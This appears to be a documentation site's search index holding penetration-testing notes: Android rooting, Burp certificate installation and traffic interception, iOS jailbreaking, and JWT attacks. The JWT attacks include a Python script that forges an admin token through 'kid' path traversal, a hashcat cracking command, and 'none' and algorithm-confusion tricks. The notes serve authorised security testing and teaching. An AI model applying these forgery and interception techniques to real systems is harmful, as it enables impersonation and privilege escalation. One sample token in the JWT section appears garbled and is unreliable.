{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Penetration Testing Notes","text":"<p>TBC</p>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/","title":"Beginner's Guide to Testing Android Apps","text":"<p>Android is a mobile operating system developed by Google. It is based on a modified version of the Linux kernel. It runs on the ARM/ARM64 hardware platform but there are x86/64 Android builds.</p> <p>Android applications are written in Java can be decompiled easily. Android apps are deployed using APKs, which govern how it's installed on a device. An APK is essentially a ZIP file with specific content. It consists of:</p> <ul> <li><code>AndroidManifest.xml</code> - declares app attributes, config and metadata.</li> <li><code>classes.dex</code> - compiled app code</li> <li><code>resources.arsc</code> - compiled app resources</li> <li><code>res/</code> - folder with non-compiled resources</li> <li><code>assets/</code> - optional folder with app assets</li> <li><code>lib/</code> - optional folder containing compiled code e.g. 3rd party libraries</li> <li><code>META-INF/</code> - contains <code>MANIFEST.MF</code>, which contains metadata about the package</li> </ul>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#testing-on-a-physical-device","title":"Testing on a Physical Device","text":""},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#accessing-android-cli","title":"Accessing Android CLI","text":"<p>The Android OS can be accessed using CLI.</p> <ol> <li>Install Android Studio on your laptop<ol> <li>This will install Android Platform Tools which includes <code>adb</code> (Android Debug Bridge) and Fastboot</li> </ol> </li> <li>Connect your Android device to the laptop via USB</li> <li>Enable Debugging interface on the phone. This allows us to interact with the device using <code>adb</code><ol> <li>Go to About Device and click 7 times on the Build Number to Enable Developer options</li> <li>Go to Developer options and click on Enable \"USB Debugging\"</li> </ol> </li> <li>Start an <code>adb shell</code> on your testing laptop. The <code>adb</code> executable should be under the path <code>C:\\Users\\{username}\\AppData\\Local\\Android\\Sdk\\platform-tools&gt;</code> if installed with Android Studio.</li> </ol> <pre><code>adb shell\n</code></pre>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#pairing-an-android-device-to-laptop-via-wifi","title":"Pairing an Android Device to Laptop via Wifi","text":"<p>If you don't have a USB cable, you can connect pair the android device via wifi</p> <p>Requirements: Developer options need to be enabled</p> <ol> <li>Connect the Android phone to the same Wifi as the laptop</li> <li>Search pair in settings</li> <li>Select pair device with pairing code</li> <li>Type the following on your laptop to connect the device the laptop </li> </ol> <pre><code>adb pair ip:port\n</code></pre>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#rooting-a-physical-device","title":"Rooting a physical device","text":"<p>Rooting a device is not necessary but brings about some benefits, including:</p> <ul> <li>Full access to the operating system</li> <li>Makes it easy to install tools</li> <li>Allows us to install our Burp certificate as a system-level trusted certificate (so we don't get errors in our Burp dashboard!)</li> </ul> <p>Drawbacks to rooting a device - Some phones have a warranty bit that burns each time the boot loader is unlocked - Locks you out of functionality like Google Pay - Unlocking boot loader deletes all data</p> <p>Tutorials on rooting device: How to root your Android smartphone: Google, OnePlus, Samsung, Xiaomi, and more (xda-developers.com)</p> <p>Checkout Checkra1n or Unc0ver to jailbreak. Some useful tools to install after jailbreak: - Magisk - Root checker</p>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#testing","title":"Testing","text":""},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#proxying-traffic-to-burp","title":"Proxying traffic to Burp","text":"<ol> <li>Install Burp Certificate on the device (see Installing Burp Certificates)</li> <li>Start a mobile hotspot on the test laptop</li> <li>Open a new Burp project</li> <li>Set the proxy listener to the local network IP (mobile hotspot router IP)</li> <li>Join hotspot wifi network</li> <li>Go to wifi settings</li> <li>Edit settings for current wifi network</li> <li>Select \"Advanced Settings\" </li> <li>Find \"Proxy\"</li> <li>Set proxy to <code>192.168.137.1:8080</code> or equivalent IP and port that Burp is listening to</li> <li>Visit browser and search google to see requests</li> </ol>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#testing-on-an-emulator","title":"Testing on an Emulator","text":""},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#setting-up","title":"Setting up","text":"<ol> <li>Install Android Studio on your laptop</li> <li>Download an Emulator on Android Studio<ol> <li>Go to Settings  &gt; Appearance &amp; Behaviour &gt; System Settings &gt; Android SDK</li> <li>Select the latest version of Android Emulator in SDK Tools tab</li> <li>Go to Tools &gt; Device Manager. Select Create Device</li> </ol> </li> <li>Drag the <code>.apk</code> file of your application to the emulator to install the app on the device</li> </ol>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#rooting-an-emulator","title":"Rooting an emulator","text":"<p>There's no need to root an emulator. You can simply start <code>adb</code> as root. <pre><code>adb root\nadb shell\nemu64xa:/\n</code></pre> If you need a writable file system e.g. to install the a system-level trusted Burp certificate on the emulator, start the emulator from CLI using the <code>-writable-system</code> option <pre><code>.\\emulator.exe -writable-system -avd Pixel_3a_API_34_extension_level_7_x86_64\n</code></pre></p> <p>I found that this method works sometimes but at times the Burp cert will only install as a user-level trusted certificate. This might be because of some subtleties with Google APIs version 28 and later. To get around this, you'll need create an emulator which supports Google APIs before version 28 and install Magisk on the emulator. See this guide for more information - Installing Burp Certificates.</p>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#testing_1","title":"Testing","text":""},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#proxying-traffic-to-burp_1","title":"Proxying traffic to Burp","text":"<ol> <li>Install Burp Certificate on the device (see Installing Burp Certificates])</li> <li>Create a new Burp project</li> <li>Open an emulator in Android Studio</li> <li>With emulator open, click on More </li> <li>Click on Settings and Proxy</li> <li>Select Manual proxy configuration</li> <li>Enter the IP and Port that Burp is listening on</li> </ol>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#troubleshooting","title":"Troubleshooting","text":""},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#no-traffic-showing-in-burp-proxy-history","title":"No traffic showing in Burp Proxy History","text":"<p>This is likely due to Windows Firewall blocking traffic from the Android Device. Turn off the Private and Public Firewall and send traffic again. </p>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#errors-showing-on-burp-dashboard","title":"Errors showing on Burp Dashboard","text":"<p>This could be because of SSL Pinning. Implement the following fixes to bypass SSL Pinning.</p> <p>See more to bypass SSL Pinning https://justinpineda.com/2020/11/27/bypassing-ssl-pinning-and-traffic-redirection-to-burp-suite-using-mobsf-and-genymotion/</p>"},{"location":"Mobile%20Application%20Testing/Android/Beginner%27s%20Guide%20to%20Testing%20Android%20Apps/#the-emulator-device-is-slow-af","title":"The emulator device is slow AF","text":"<p>Increase the RAM on the device. Right click on the emulator in AVD manager and click on Show on disk. Edit the hw.ramSize in <code>config.ini</code>. The default size is 1536 MB. Increasing it to 4096 MB will work a charm.</p>"},{"location":"Mobile%20Application%20Testing/Android/Installing%20Burp%20Certificates/","title":"Installing Burp Certificates","text":""},{"location":"Mobile%20Application%20Testing/Android/Installing%20Burp%20Certificates/#installing-burp-certificates","title":"Installing Burp Certificates","text":""},{"location":"Mobile%20Application%20Testing/Android/Installing%20Burp%20Certificates/#certificates","title":"Certificates","text":"<p>To successfully intercept SSL traffic we need to proxy the app with the Burp Suite Certificate. </p>"},{"location":"Mobile%20Application%20Testing/Android/Installing%20Burp%20Certificates/#installing-burp-certificate-as-user-level-trusted-certificate","title":"Installing Burp certificate as user-level trusted certificate","text":"<ol> <li>Start a mobile hotspot on hacktop</li> <li>Connect to hacktop hotspot from device</li> <li>Visit <code>http://burp</code> or <code>http://192.168.137.1:8080</code> to load the burp webpage</li> <li>Download the certificate</li> <li>Install the certificate: <ol> <li>Rename the cert extension to .cer instead of .der</li> <li>Go to <code>Settings -&gt; Security -&gt; Encryption and Credentials -&gt; Install a Certificate</code></li> <li>Select the newly downloaded cert and install it into the user certificate store</li> </ol> </li> </ol> <p>Note that this will install the Portswigger cert as a user certificate, if the device is not rooted.</p>"},{"location":"Mobile%20Application%20Testing/Android/Installing%20Burp%20Certificates/#installing-burp-certificate-as-system-level-trusted-certificate-emulator","title":"Installing Burp certificate as system-level trusted certificate - Emulator","text":"<p>Root the device https://www.youtube.com/watch?v=vO92Gs9kyfg 1. Create a emulator device that uses Google APIs prior to v28.  2. Start the emulator device either from Android studio or command line. 3. Install Magisk from RootAVD . 4. Run <code>.\\rootAVD.sh</code> if on Linux, or <code>.\\runAVD.bat</code> on Windows.</p> <p>Install the certificate https://www.youtube.com/watch?v=qQicUW0svB8 1. Move the burp cert (cacert.cer) to the device SD card and install it 2. Download the AlwaysTrustUserCert Magisk package and move it to the device SD card. 3. Install the AlwayTrustUserCert Magisk package on Magisk.</p> <p>The Burp cert should now be a System and user trusted certificate.</p>"},{"location":"Mobile%20Application%20Testing/Android/Installing%20Burp%20Certificates/#installing-burp-certificate-as-a-system-level-trusted-certificate-physical-device","title":"Installing Burp certificate as a system-level trusted certificate - Physical Device","text":"<p>Trusted Certificate Authorities for Android are stored in <code>/system/etc/security/cacerts</code>. </p> <ol> <li>Export Burp cert in DER format https://blog.ropnop.com/configuring-burp-suite-with-android-nougat </li> <li>Convert the certificate to a PEM file type <pre><code>openssl x509 -inform DER -in cacert.der -out cacert.pem\n</code></pre></li> <li>Get the <code>subject_hash_old</code>value of the certificate (the hash of the certificate subject name) <pre><code>openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1\n</code></pre></li> <li>Rename the file to the <code>subject_hash_old</code> value, appended with <code>.0</code> to the filename <pre><code>mv cacert.pem &lt;hash&gt;.0\n</code></pre></li> <li>Copy the certificate to the device. We need to remount the device as a writable file system, which we can do if we're root. <pre><code>adb root\nadb remount\nadb push &lt;cert&gt;.0 /sdcard/\n</code></pre></li> <li>Go into the phone's file system <pre><code>adb shell\n</code></pre></li> <li>Move the cert to the cacerts directory and change the file permissions of the cert. <pre><code>mv /sdcard/&lt;cert&gt;.0 /system/etc/security/cacerts/\nchmod 644 /system/etc/security/cacerts/&lt;cert&gt;.0\n</code></pre></li> <li>Reboot the device <pre><code>adb reboot\n</code></pre></li> </ol> <p>The Portswigger cert should appear as a system certificate now. </p>"},{"location":"Mobile%20Application%20Testing/Android/Installing%20Burp%20Certificates/#troubleshooting-issues-with-installing-system-level-trusted-certificates","title":"Troubleshooting issues with installing system-level trusted certificates","text":"<p>Note that Google Pixels and emulators installed with Google APIs prevent certificates from being installed as system certificates, even with root privileges</p> <p>Testing on a physical device</p> <ol> <li>Jailbreak the Android device</li> <li>Install Magisk</li> <li>Install always trust user certificates module via Magisk </li> </ol> <p>Testing using an emulator Make sure to install an emulator without Google APIs and follow the above instructions.</p>"},{"location":"Mobile%20Application%20Testing/Android/Rooting%20Android%20Devices/","title":"Rooting Android Devices","text":"<ol> <li>Enable developer options on device.<ol> <li>Go to About device</li> <li>Tap on build number several times</li> </ol> </li> <li>Click on Developer options</li> <li>Turn on USB debugging through ADB.</li> <li>Turn on OEM unlocking</li> <li>Connect the Android device to the computer via USB.</li> <li>Click Allow USB debugging.</li> <li>Start the adb server - <code>adb start-server</code>.</li> <li>Check that the device is accessible from the computer - <code>adb devices</code>.</li> <li>Turn on the OEM unlock option.</li> </ol>"},{"location":"Mobile%20Application%20Testing/Android/Rooting%20Android%20Devices/#unlocking-bootloader","title":"Unlocking bootloader","text":"<ol> <li>Retrieve the appropriate bootloader drivers for our computer.</li> <li>Switch off the device and boot into the bootloader mode - <code>adb reboot bootloader</code>.</li> <li>Type in the following commands when the phone is in bootloader mode: <pre><code>fastboot flashing unlock\nfastboot oem unlock\n</code></pre></li> </ol>"},{"location":"Mobile%20Application%20Testing/Android/Rooting%20Android%20Devices/#install-magisk","title":"Install Magisk","text":"<ol> <li>Download Magisk from the official Magisk Github.</li> <li>Move the APK into the Android device or use <code>adb install magisk.apk</code>. <pre><code>adb push [computer path to Magisk APK] /sdcard/Download\n</code></pre></li> <li>Go to Files on the Android device.</li> <li>Install Magisk onto the device.</li> </ol>"},{"location":"Mobile%20Application%20Testing/Android/Rooting%20Android%20Devices/#install-patched-image-on-the-android-device","title":"Install patched image on the Android Device","text":"<ol> <li>Retrieve the factory image for the test device from Google.</li> <li>Move the boot.img (<code>boot.img</code>, <code>init_boot.img</code>, or <code>recovery.img</code>) to the device with ADB. <pre><code>adb push [computer path to factory image] /sdcard/Download\n</code></pre></li> <li>Press the Install button in Magisk.</li> <li>Choose Select and Patch a File and select the factory image for the device.</li> <li>Copy the patched image to our computer using ADB. <pre><code>adb pull /sdcard/Download/magisk_patched_[random_strings].img\n</code></pre></li> <li>Send the device into fastboot mode using the following command. <pre><code>adb reboot bootloader\n</code></pre></li> <li>Flash the patched boot image to the Android device. <pre><code>fastboot flash boot .\\magisk_patched_[random_strings].img\n</code></pre></li> <li>Reboot the device.</li> <li>Launch Magisk.</li> <li>Open <code>adb shell</code></li> <li>Switch users to root using <code>su</code>.</li> <li>Authorise superuser access on Magisk.</li> </ol>"},{"location":"Mobile%20Application%20Testing/Android/Rooting%20Android%20Devices/#references","title":"References","text":"<ul> <li>Guide to Android Rooting</li> <li>Magisk Installation Guide</li> <li>Google USB Driver</li> <li>Troubleshooting fastboot</li> </ul>"},{"location":"Mobile%20Application%20Testing/iOS/Jailbreaking/","title":"Jailbreaking","text":""},{"location":"Mobile%20Application%20Testing/iOS/Jailbreaking/#paler1n","title":"Paler1n","text":"<ul> <li>https://palera.in/</li> <li>https://ios.cfw.guide/installing-palera1n/#running-palera1n Palera1n is a jailbreak available for iOS 15.0-16.5. You need to run Palera1n from a Mac or a bootable version of Linux, and follow the instructions on screen.</li> </ul> <p>[!Note] You need to reset the iPhone and set it up with no passcode for iOS 16 and later, otherwise the jailbreak will not work</p> <p>After the phone is jailbroken, install Sileo, which is the \"app store\" for jailbroken devices.</p> <p>Note that once the iphone restarts, the jailbreak is lost 1. Download the palera1n binary on your MacBook 2. Connect the iPhone to the MacBook via USB-A to Lightning, and USB-A to USB-C dongle. 3. Create a fake file system for the device <pre><code>palerain -cf\n</code></pre> 4. Hit enter when the executable says hit enter. Follow the onscreen instructions. Make sure to hold the volume down and power button at the same time. Then continue holding the volume down button. 5. Unplug the cord when the executable errors out and replug the cable. 6. Re-jailbreak the device in rootful mode with <pre><code>palerain -f\n</code></pre> 7. Redo step 4</p> <p>Palera1n should now appear as an app on the phone. Install the Sileo package manager</p>"},{"location":"Mobile%20Application%20Testing/iOS/Jailbreaking/#ssh","title":"SSH","text":"<ol> <li>Install NewTerm2 from Sileo</li> <li>Change the root password of the iphone on NewTerm2 <pre><code>sudo passwd root\n</code></pre></li> <li>SSH to our iPhone from our computer <pre><code>ssh root@IP of phone\n</code></pre></li> </ol>"},{"location":"Mobile%20Application%20Testing/iOS/Jailbreaking/#useful-apps-from-sileo","title":"Useful apps from Sileo","text":"<ul> <li>ssh</li> <li>xterm</li> </ul>"},{"location":"Web%20Application%20Testing/Authentication/JWT/Introduction%20to%20JWTs/","title":"Introduction to JWTs","text":"<p>JWT is composed of three parts - header     - <code>{'alg': 'HS256', 'typ': 'JWT'}</code>     - HMAC-SHA256 - payload     - <code>{'loggedInAs': 'admin', 'iat':1091830921}</code>     - iat = issued at - signature     - Uses algorithm specified in header, a secret key specified by the application, and unsigned token to create a signature</p> <pre><code>header = '{\"alg\":\"HS256\",\"typ\":\"JWT\"}'\npayload = '{\"loggedInAs\":\"admin\",\"iat\":1422779638}'\nkey = 'secretkey'\nunsignedToken = encodeBase64(header) + '.' + encodeBase64(payload)\nsignature = HMAC-SHA256(key, unsignedToken)\ntoken = encodeBase64(header) + '.' + encodeBase64(payload) + '.' + encodeBase64(signature)\n// Result: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InVzZXIiLCJpYXQiOiIxNjUxNTM4ODI5In0.NTEyYTI3YzZhZWVmMDI1ZDNhZWI4ZjdlZGE2ODI0NzE3YzVhZWZlMzI1NjZiYjgxZDYzYTM2MWY2YWU2ODcwZgeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoiYWRtaW4iLCJpYXQiOjE0MjI3Nzk2Mzh9.gzSraSYS8EXBxLN_oWnFSRgCzcmJmMjLiuyu5CSpyHI\n</code></pre>"},{"location":"Web%20Application%20Testing/Authentication/JWT/Introduction%20to%20JWTs/#attack-vectors","title":"Attack Vectors","text":"<ul> <li>'none' signature attack</li> <li>Bruteforcing JWT Secret</li> <li>Directory Traversal in 'kid' parameter</li> <li>Signature confusion</li> </ul>"},{"location":"Web%20Application%20Testing/Authentication/JWT/Attack%20Vectors/%27none%27%20signature%20attack/","title":"'none' signature attack","text":"<p>The algorithm used to sign a JWT is specified in the <code>alg</code> field of its header.</p> <p>A user can modify the algorithm so it is set to <code>none</code>. This will result in the signature being an empty string <code>signature = ''</code> . Most JWT library implementations will fail token verification, if <code>none</code> is specified as the algorithm and a secret key is provided by the application.</p> <p>If an application does not perform token verification properly, an attacker can modify JWTs without detection. This can allow an attacker to gain access to restricted resources, impersonate other users and escalate privileges.</p> <p>For example, as an attacker, we can modify our scope area to elevate our privileges. Another way we can gain additional privileges is to modify the unique identifier in the payload to an ID of another user (if the field exists).</p> <p></p>"},{"location":"Web%20Application%20Testing/Authentication/JWT/Attack%20Vectors/%27none%27%20signature%20attack/#references","title":"References","text":"<ul> <li>How to Test JWT NONE Algorithm Vulnerability</li> </ul>"},{"location":"Web%20Application%20Testing/Authentication/JWT/Attack%20Vectors/Bruteforcing%20JWT%20Secret/","title":"Bruteforcing JWT Secret","text":"<pre><code>hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;\n</code></pre>"},{"location":"Web%20Application%20Testing/Authentication/JWT/Attack%20Vectors/Directory%20Traversal%20in%20%27kid%27%20parameter/","title":"Directory Traversal in 'kid' parameter","text":"<p>The key identifier value represents the key file used to hash the header and payload to create the signature for the JWT.</p> <p>In this attack, we can modify the kid to be the path to <code>/dev/null</code> which points to nothing. This allows us to construct our signature, as the key is a value something we know, an empty string.</p> <pre><code>#{\"typ\":\"JWT\",\"alg\":\"HS256\",\"kid\":\"../../../../../../../../../../../../../../../dev/null\"}\n\nalg_enc = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0=\"\n\n# {\"user\":\"admin\"}\npayload_enc = \"eyJ1c2VyIjoiYWRtaW4ifQ==\"\n\nheader = alg_enc + \".\" + payload_enc\n\n# /dev/null\nsecret = \"\"\n\ndigest = hmac.new(bytes(secret, encoding='utf-8'), header.encode('utf-8'), hashlib.sha256).digest()\n\nsignature = base64.urlsafe_b64encode(digest)\n\nprint(header + '.' + signature.decode('utf-8'))\n</code></pre>"},{"location":"Web%20Application%20Testing/Authentication/JWT/Attack%20Vectors/Signature%20confusion/","title":"Signature confusion","text":"<p>Note that the HMAC algorithm involves a symmetric key to verify JWT communicated back and forth between the client and server. </p> <p>RSA can also be specified as an algorithm, but uses asymmetric keys. The public key is known to the client while the server signs the data with their private key, and verifies it with its corresponding public key.</p> <p>The catch Suppose the backend system intends to verify the token via RSA. In its intended functionality,  the server verify that the signature matches the header and payload after decrypting it, using its public key.</p> <p><code>assert(decrypt(public key, signature) == header+payload)</code></p> <p>But since the user controls the algorithm specified in the header, I can change RSA256/384/512 to HS256. This will indicate to the server, to verify the token by comparing the hashes produced by HMAC using the key on the backend.</p> <p>Since I know the server's public key, I can produce a signature using HMAC, using the public key. The server will then verify the token by using this public key (symmetric key).</p>"}]}